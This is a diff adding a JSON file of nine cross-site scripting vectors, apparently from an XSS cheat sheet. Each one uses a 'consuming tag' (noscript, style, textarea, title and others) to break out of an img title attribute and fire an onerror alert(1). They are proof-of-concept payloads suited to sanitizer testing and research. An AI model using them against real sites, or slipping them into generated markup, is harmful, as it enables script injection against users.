@@ -1,0 +1,101 @@
+[
+    {
+        "description": "Noembed consuming tag",
+        "code": "<noembed><img title=\"<\/noembed><img src onerror=alert(1)>\"></noembed>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Noscript consuming tag",
+        "code": "<noscript><img title=\"<\/noscript><img src onerror=alert(1)>\"></noscript>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Style consuming tag",
+        "code": "<style><img title=\"<\/style><img src onerror=alert(1)>\"></style>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Script consuming tag",
+        "code": "<script><img title=\"<\/script><img src onerror=alert(1)>\"></script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "iframe consuming tag",
+        "code": "<iframe><img title=\"<\/iframe><img src onerror=alert(1)>\"></iframe>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "xmp consuming tag",
+        "code": "<xmp><img title=\"<\/xmp><img src onerror=alert(1)>\"></xmp>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "textarea consuming tag",
+        "code": "<textarea><img title=\"<\/textarea><img src onerror=alert(1)>\"></textarea>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "noframes consuming tag",
+        "code": "<noframes><img title=\"<\/noframes><img src onerror=alert(1)>\"></noframes>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Title consuming tag",
+        "code": "<title><img title=\"<\/title><img src onerror=alert(1)>\"></title>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    }
+]
